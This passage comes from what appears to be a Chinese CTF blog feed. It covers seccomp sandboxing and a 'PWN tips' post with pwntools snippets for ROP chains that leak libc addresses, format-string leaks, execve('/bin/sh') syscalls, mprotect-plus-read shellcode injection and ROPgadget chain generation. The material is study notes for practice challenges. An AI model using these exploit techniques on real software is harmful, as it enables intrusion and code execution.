添加规则</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">//v1 对应上面初始化的返回值</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\">// 0x7fff0000 即对应宏 SCMP_ACT_ALLOW（黑名单）</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">// 第三个参数代表对应的系统调用号，0-->read/1-->write/2-->open/60-->exit</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传 0 不做任何限制</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7FFF0000LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">231LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token comment\">// seccomp_load - Load the current seccomp filter into the kernel</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\">//load 成功则返回 0，这里 load 失败会执行 if 内部函数</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  \t<span class=\"token comment\">// seccomp_release - Release the seccomp filter state</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  \t<span class=\"token comment\">// 但对已经 load 的过滤规则不影响</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"seccomp error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">seccomp_release</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  释放</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0E5NTE4NjA1NTUvYXJ0aWNsZS9kZXRhaWxzLzExNjczODY3Ng==\">https://blog.csdn.net/A951860555/article/details/116738676</span></p>\n<p>这里给出关于 <code>seccomp_load</code>  的定义：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;seccomp.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span> scmp_filter_ctx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">seccomp_load</span><span class=\"token punctuation\">(</span>scmp_filter_ctx ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Link with <span class=\"token operator\">-</span>lseccomp<span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>DESCRIPTION：</p>\n<p>Loads the seccomp filter provided by ctx into the kernel; if the function succeeds the new seccomp filter will be active when the  <code>function returns</code> .  函数返回时过滤开始运行【seccomp_load 是应用过滤，seccomp_reset 是解除过滤。】</p>\n<p>返回值：Returns zero on success or one of the following error codes on failure；成功时返回  <code>0</code> ，失败返回对应错误代码</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy9tYW4vc2VjY29tcF9sb2FkLjMuZW4jREVTQ1JJUFRJT04=\">https://man.archlinux.org/man/seccomp_load.3.en#DESCRIPTION</span></p>\n<p><code>seccomp_rule_add</code>  是添加一条规则</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">seccomp_rule_add</span><span class=\"token punctuation\">(</span>scmp_filter_ctx ctx<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>             <span class=\"token class-name\">uint32_t</span> action<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> syscall<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> arg_cnt<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>arg_cnt 表明是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，如果仅仅需要允许或者禁止所有某个系统调用，arg_cnt 直接传入 0 即可，seccomp_rule_add (ctx, SCMP_ACT_KILL, SCMP_SYS (execve), 0) 即禁用 execve，不管其参数如何。</p>\n<h1 id=\"3使用seccomp-tools\"><a class=\"anchor\" href=\"#3使用seccomp-tools\">#</a> 3. 使用 seccomp-tools</h1>\n<p>命令：<br />\nseccomp-tools dump ./pwn</p>\n<p>此处用 buuctf 例题  <code>orw</code>  说明：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/23/pPTmaJx.png\" alt=\"\" /></p>\n<h1 id=\"4绕过\"><a class=\"anchor\" href=\"#4绕过\">#</a> 4. 绕过</h1>\n<p>一般运用 orw 函数的方式进行读取 flag</p>\n<h1 id=\"5注意\"><a class=\"anchor\" href=\"#5注意\">#</a> 5. 注意</h1>\n<p>当使用了 prctl (4, 0) 时</p>\n<p>4 对应的宏是 <code>PR_SET_DUMPABLE</code> ，第二个参数为 0 的话则不能被 dump，为 1 可以被 dump。换句话说，该程序我们无法使用 seccomp-tools dump ./pwn 来查看其系统调用情况，只能靠阅读代码分析。同时在进行 gdb 调试时，执行到 prctl (4, 0) 这行时程序也会被终止。不过只要以 root 身份执行，那么 <code>secccomp-tools</code>  和 gdb 调试都没问题，估计应该是限制了一般身份用户的 dump 行为</p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjMxNzQ1NjE=\">https://zhuanlan.zhihu.com/p/363174561</span></p>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/",
            "title": "堆",
            "date_published": "2023-08-24T12:15:56.000Z",
            "content_html": "<p>chunk 的 p 位设为 1 即上一个 chunk 被使用并且上一个 chunk 可以使用 pre_size 的空间  （用来储存前一个物理相邻的 chunk 的数据 ，（两个都空闲才合并）</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/",
            "url": "https://vvwwvv.cn/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/",
            "title": "PWN小技巧",
            "date_published": "2023-08-24T11:23:15.000Z",
            "content_html": "<h1 id=\"centerpwn小技巧center\"><a class=\"anchor\" href=\"#centerpwn小技巧center\">#</a> &lt;center&gt;PWN 小技巧 &lt;/center&gt;</h1>\n<h3 id=\"164位程序与32位程序payload\"><a class=\"anchor\" href=\"#164位程序与32位程序payload\">#</a> 1.64 位程序与 32 位程序 payload</h3>\n<p>​\t64 位程序 payload 要先用 pop_rdi 覆盖 ret 然后依次是 调用函数的参数，调用函数本身，最后是返回地址（32 位程序传参不需要用寄存器）<br />\n​\t32 位程序是调用函数 <strong>先函数本身</strong> ，然后是函数返回地址，再是参数，然后接着是函数本身再是返回地址，最后是参数.... 这种循环（返回地址可以用 pop_ret 这种代替）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4009A0</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>先是垃圾字符，然后pop_rdi,接着put_got是利用执行put_plt泄露的地址，最后是返回地址\n</code></pre>\n<p>**2025 更新：**32 位程序调用多个函数时，第一个函数的返回地址是第二个函数的地址，然后是第一个函数的参数，第二个函数的参数，如：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"b\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>gets<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#gets 是第一个返回地址，system 是 gets 的返回地址，第一个 bss 是 gets 的参数（也是 system 的返回地址但不影响），第二个 bss 是 system 的参数</span></pre></td></tr></table></figure><h4 id=\"32位程序寄存器传参\"><a class=\"anchor\" href=\"#32位程序寄存器传参\">#</a> 32 位程序寄存器传参：</h4>\n<p>先函数，再寄存器，再参数 (ctfshow55)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>rbx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xacacacac</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>rbx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xbdbdbdbd</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里 flag_func1 没有参数</p>\n<p>一般方式传参：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag_func2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xacacacac</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xbdbdbdbd</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"2注意栈对齐ubuntu18以上格外注意\"><a class=\"anchor\" href=\"#2注意栈对齐ubuntu18以上格外注意\">#</a> 2. 注意栈对齐（Ubuntu18 以上格外注意）</h3>\n<p>在 ubuntu18 版本 64 位程序在执行 system 函数时会要求 16 字节对齐也就是地址最低位为 0，而 64 位程序地址结尾为 <code>0</code>  或 <code>8</code> , 所以当 system 地址为 8 时只要地址 + 8 即可，所以一般前面会有个 ret 来保持栈对齐</p>\n<p>产生这个问题的原因是在执行 system 时，里面的 <code>movaps</code>  指令，该指令要求内存地址要 16 字节对齐，也就强迫地址以 <code>0</code>  结尾（如：存放 system 的 <code>地址</code> 为 <code>0x7ffe8a3625f0</code> ）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWklLSDI2L2FydGljbGVzLzE1OTk2ODc0Lmh0bWw=\">https://www.cnblogs.com/ZIKH26/articles/15996874.html</span></p>\n<h3 id=\"3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串\"><a class=\"anchor\" href=\"#3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串\">#</a> 3. 泄露的函数接收时，需要看其最后返回地址的函数是否有输出字符串，如有则先接收返回地址输出的字符串</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>put_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>返回地址<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input your Plaintext to be encrypted\\n\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#返回地址中输出的字符串</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#返回地址中输出的字符串</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#ljust 在原字符串后添加</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    接收最好用这个 puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t                   puts<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>【有时会直接输出地址以 16 进制形式，我们要直接进行接收】</p>\n<p>例一、</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Yippie, lets crash: %p\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 例如这种输出</span></pre></td></tr></table></figure><p>接收方式：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>stack<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#接收回显的参数在栈上的地址，长度是 10，以 16 进制表示</span></pre></td></tr></table></figure><p>例二、</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%6s\"</span><span class=\"token punctuation\">,</span> format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 此处输入的是  %7$p  泄露偏移为 7 的地方的值</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 打印上面泄露的值</span></pre></td></tr></table></figure><p>接收</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"0x\"</span><span class=\"token punctuation\">)</span>                   <span class=\"token comment\">#原本输出值为 0x76d7e5e9e493e00</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>stroy<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>       <span class=\"token comment\">#以 16 进制接收 16 个字符</span></pre></td></tr></table></figure><p>例三、</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We need to load the ctfshow_flag.\\nThe current location: %p\\n\"</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>接收： <code>addr=int(p.recv(10),16)</code> // 这里的字节数是调试输出数出来的</p>\n<h3 id=\"4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0\"><a class=\"anchor\" href=\"#4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0\">#</a> 4. 有时接收不能用 u64 (p.recv ()), 会出错，利用 u64 (p.recvuntil (b'\\n')[:-1].ljust (8,b'\\0'))</h3>\n<h3 id=\"5遇到要绕过strlen函数要绕过时用-bx00-截断\"><a class=\"anchor\" href=\"#5遇到要绕过strlen函数要绕过时用-bx00-截断\">#</a> 5. 遇到要绕过 strlen 函数要绕过时用 b&quot;\\x00&quot; 截断</h3>\n<h3 id=\"6系统调用是调用execvebinshnullnull平常调用为systembinsh\"><a class=\"anchor\" href=\"#6系统调用是调用execvebinshnullnull平常调用为systembinsh\">#</a> 6. 系统调用是调用 execve (&quot;/bin/sh&quot;,NULL,NULL)【平常调用为 system (&quot;/bin/sh&quot;)】</h3>\n<pre><code>32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用（）\n\n当eax=11时即为系统调用号调用命令execve，参数&quot;/bin/sh&quot;赋给ebx\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQR56.png\" alt=\"\" /></p>\n<pre><code>64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用\n</code></pre>\n<p>【利用 ROPgadget 的命令可以直接构造出一个系统调用 ropchain】</p>\n<pre><code>ROPgadget --binary rop --ropchain\n</code></pre>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqDu9A.png\" alt=\"\" /></p>\n<p>使用方式：将这段代码复制过去加上对应个数的 padding 即可， <strong>注意</strong> 工具生成的代码和我们日常使用的代码格式和风格上都有一定差距，从 struct 包中导入的 pack 函数也会和 pwntools 中的 pack 起冲突，如果一定要使用 struct 的 pack，就在导入 pwntools <code>后</code> 再 <code>导入struct</code> ，这样就可以覆盖掉 pack</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqriCj.png\" alt=\"\" /></p>\n<h3 id=\"7有mprotect函数可以改变内存的读写权限最好修改bbs段其他段的有问题\"><a class=\"anchor\" href=\"#7有mprotect函数可以改变内存的读写权限最好修改bbs段其他段的有问题\">#</a> 7. 有 mprotect 函数可以改变内存的读写权限（最好修改 bbs 段，其他段的有问题）</h3>\n<pre><code>mprotect(起始地址，修改内存长度，修改的权限（修改为7） )\n\n指定的内存区间必须包含整个内存页(4k)，起始地址必须是页的起始地址(末尾为000),修改区间的长度必须是页的整数倍【4k对应的16进制为0x1000】\n\nmem_addr (起始地址)= 0x80EB000   mem_size(内存长度) = 0x1000   mem_proc(权限) = 0x7 【32位程序时也可以找任意三个寄存器来传参(如pop ebx;pop exi;pop ebp;ret)，为了控制后续的返回地址】\n\n在可以利用执行shellcode时可以用，修改一个位置可执行，然后调用read存入shellcode加以执行\n\npayload=b&quot;a&quot;*0x2d\n\npayload+=p32(mprotect)+p32(pop_ret)+p32(plt_got)+p32(0x100)+p32(0x7)\n\n此处没有覆盖ebp，因为查看汇编ebp还未入栈，所以直接覆盖ret，后面的为调用3个寄存器\n\npayload+=p32(read)+p32(pop_ret)+p32(0)+p32(plt_got)+p32(0x100)+p32(plt_got)\n\n返回地址为read，\n\n此处调用顺序为 执行函数，寄存器_返回地址，参数，函数返回地址(32位程序下，与一般32位不同，一般不调用寄存器)\n</code></pre>\n<h3 id=\"8shellcode编写\"><a class=\"anchor\" href=\"#8shellcode编写\">#</a> 8.shellcode 编写</h3>\n<pre><code>用pwntools生成：\n\nshellcode = asm(shellcraft.sh())\n\nshellcode网址（用的时候不知道为什么不行）：\n\n[https://www.exploit-db.com/](https://www.exploit-db.com/ &quot;漏洞利用数据库 - 渗透测试人员、研究人员和道德黑客的漏洞利用 (exploit-db.com)&quot;)\n\n[http://shell-storm.org/shellcode/index.html](http://shell-storm.org/shellcode/index.html &quot;Shellcodes database for study cases (shell-storm.org)&quot;)\n</code></pre>\n<h3 id=\"9strcmp绕过\"><a class=\"anchor\" href=\"#9strcmp绕过\">#</a> 9.strcmp () 绕过</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/fc1eb2d3cb7a463e8599114af5c2da07.png\" alt=\"\" /></p>\n<h5 id=\"str1str2时返回0一般用这个绕过也可以用x00截断\"><a class=\"anchor\" href=\"#str1str2时返回0一般用这个绕过也可以用x00截断\">#</a> str1=str2 时返回 0，一般用这个绕过，也可以用 \\x00 截断</h5>\n<h3 id=\"10switch语句\"><a class=\"anchor\" href=\"#10switch语句\">#</a> 10.switch () 语句</h3>\n<pre><code>switch(表达式)&#123; \n    case 常量表达式1:  语句1;\n    case 常量表达式2:  语句2;\n    … \n    case 常量表达式n:  语句n;\n    default:  语句n+1;\n\n&#125;\n</code></pre>\n<h5 id=\"将表达式的结果与常量表达式依次比较直到相同\"><a class=\"anchor\" href=\"#将表达式的结果与常量表达式依次比较直到相同\">#</a> 将表达式的结果与常量表达式依次比较直到相同</h5>\n<h3 id=\"11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等\"><a class=\"anchor\" href=\"#11-栈溢出注意输入的payload是不是再栈上有时不是输入在栈上后面可能会调用strcpy此时可能会将输入的payload复制到栈上需要按照复制后的栈填充垃圾字符等等\">#</a> 11. 栈溢出注意输入的 payload 是不是再栈上，有时不是输入在栈上，后面可能会调用 strcpy ()，此时可能会将输入的 payload 